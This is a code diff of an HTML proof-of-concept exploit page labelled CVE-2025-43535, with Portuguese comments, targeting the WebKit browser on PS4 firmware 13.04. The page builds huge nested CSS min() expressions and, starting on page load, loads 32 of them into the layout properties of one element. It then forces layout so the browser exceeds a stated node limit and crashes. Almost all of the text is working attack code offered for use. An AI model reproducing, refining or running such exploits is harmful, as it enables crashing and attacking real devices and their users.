@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — Unique Chunking</title>
+<title>CVE-2025-43535 — Single Node Overload</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · Bypass de Cache · PS4 FW 13.04</div>
+<div>CVE-2025-43535 · Sobrecarga de Propriedades · PS4 FW 13.04</div>
 <div id="log"></div>
 <div id="stage" style="visibility:hidden"></div>
 
@@ -24,65 +24,79 @@ const L = (m, c) => {
   d.scrollTop = d.scrollHeight;
 };
 
-// Respiro para o Garbage Collector limpar as strings do JS
-const yieldGC = () => new Promise(r => setTimeout(r, 150));
+// Respiro para o Garbage Collector do JS limpar a RAM entre propriedades
+const yieldGC = () => new Promise(r => setTimeout(r, 200));
 
-// A MÁGICA: O parâmetro 'baseVal' garante que nenhuma árvore seja igual à outra
+// Constrói a árvore única (Bypass de cache)
 function buildUniqueDepth(depth, baseVal) {
-  let e = baseVal + 'px'; // Ex: 1px, 2px, 3px...
+  let e = baseVal + 'px';
   for (let d = 1; d <= depth; d++) {
     e = 'min(' + e + ',' + e + ')';
   }
   return e;
 }
 
+// 32 Propriedades CSS que afetam diretamente o layout/geometria
+const layoutProperties = [
+  'width', 'height', 'min-width', 'min-height', 'max-width', 'max-height',
+  'margin-top', 'margin-right', 'margin-bottom', 'margin-left',
+  'padding-top', 'padding-right', 'padding-bottom', 'padding-left',
+  'top', 'right', 'bottom', 'left',
+  'border-top-width', 'border-right-width', 'border-bottom-width', 'border-left-width',
+  'outline-width', 'flex-basis', 'text-indent', 'letter-spacing',
+  'word-spacing', 'column-width', 'column-gap', 'row-gap',
+  'border-top-left-radius', 'border-bottom-right-radius'
+];
+
 async function run() {
-  L('Iniciando Ataque por Fragmentação Única...', 'warn');
+  L('Iniciando Ataque Multi-Propriedade no mesmo nó...', 'warn');
 
-  // Criamos uma única stylesheet no DOM para receber os blocos
-  const styleEl = document.createElement('style');
-  document.head.appendChild(styleEl);
-  const sheet = styleEl.sheet;
+  // Criamos o elemento alvo configurado para garantir que todas as propriedades sejam aplicadas
+  const alvo = document.createElement('div');
+  alvo.style.position = 'absolute'; // Força top/left a serem lidos
+  alvo.style.display = 'flex';      // Força flex-basis e gaps a serem lidos
+  alvo.style.borderStyle = 'solid'; // Força border-widths a serem lidos
+  document.getElementById('stage').appendChild(alvo);
 
-  // 32 blocos * 4.19M nós = ~134 Milhões de nós C++
-  // Este valor garante que ultrapassamos o threshold de 119.5M do PS4
-  const totalChunks = 32;
+  L(`Alvo criado. Vamos injetar os 32 chunks nas propriedades de layout...`, 'info');
 
-  for (let i = 1; i <= totalChunks; i++) {
+  for (let i = 0; i < layoutProperties.length; i++) {
+    const prop = layoutProperties[i];
     try {
-      L(`[${i}/${totalChunks}] Alocando árvore única com base ${i}px...`);
-      await new Promise(r => requestAnimationFrame(r)); // Atualiza o ecrã
-
-      // 1. Gera a string exclusiva de ~36MB no JavaScript
-      let uniquePayload = buildUniqueDepth(22, i);
-
-      // 2. Injeta diretamente no motor CSS (Parser C++)
-      // O insertRule devora a regra sem encher o HTML de texto
-      sheet.insertRule(`.t${i} { width: ${uniquePayload} }`, sheet.cssRules.length);
-
-      // 3. Aplica o estilo a um elemento para instanciar a árvore no Heap
-      const div = document.createElement('div');
-      div.className = `t${i}`;
-      document.getElementById('stage').appendChild(div);
+      L(`[${i+1}/32] A calcular ~4.1M nós para a propriedade: ${prop}...`);
       
-      // Força o motor a processar os cálculos C++ instantaneamente
-      void div.offsetWidth; 
-
-      // 4. Limpa a variável agressivamente para manter a RAM do JS vazia
-      uniquePayload = null;
-
-      L(`[${i}/${totalChunks}] +4.19M nós processados com sucesso.`, 'ok');
-
-      // Aguarda que o lixo do JS seja recolhido antes de continuar
+      // Gera ~36MB no JS com base única (ex: 1px, 2px, 3px)
+      let uniquePayload = buildUniqueDepth(22, i + 1);
+      
+      // Anexa diretamente ao estilo em linha (Inline Style) do elemento
+      alvo.style.setProperty(prop, uniquePayload);
+      
+      // APAGA a string do JS. O C++ já guardou a propriedade no CSSOM.
+      uniquePayload = null; 
+      
+      // Dá tempo para o Garbage Collector limpar a RAM do JS
       await yieldGC();
-
+      
     } catch(e) {
-      L(`Falha crítica no bloco ${i}: ${e}`, 'fail');
+      L(`Falha crítica na injeção da propriedade ${prop}: ${e}`, 'fail');
       break;
     }
   }
 
-  L('Todas as injeções foram concluídas. Se o ecrã não apagou, o limite é superior.', 'info');
+  L('1GB de árvores matemáticas acumulado no C++ do elemento alvo!', 'warn');
+  L('A forçar o Style Resolver a calcular TUDO EM SIMULTÂNEO...', 'crash');
+  
+  setTimeout(() => {
+    try {
+      // O GATILHO: O WebKit tem de ler e calcular as 32 propriedades ao mesmo tempo
+      // para nos dar a largura final. Isto vai estourar o limite de 119.5M de nós!
+      void alvo.offsetWidth; 
+      
+      L('Sobreviveu. O motor C++ otimizou o inline-style.', 'fail');
+    } catch(e) {
+      L('Erro no layout: ' + e, 'fail');
+    }
+  }, 500);
 }
 
 window.addEventListener('load', () => setTimeout(run, 500));
